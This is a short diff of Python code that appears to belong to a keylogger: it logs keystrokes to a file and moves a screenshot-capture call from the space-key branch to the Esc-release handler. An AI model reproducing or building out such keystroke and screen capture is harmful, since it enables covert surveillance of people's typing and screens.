@@ -32,13 +32,14 @@ def write_file(keys):
             k = str(key).replace("'", "")
             if k.find("space") > 0:
                 f.write('\n')
-                take_screenshots()
+                
             elif k.find("Key") == -1:
                 f.write(k)
 
 
 def on_release(key):
     if key == Key.esc:
+        take_screenshots()
         return False
 
 
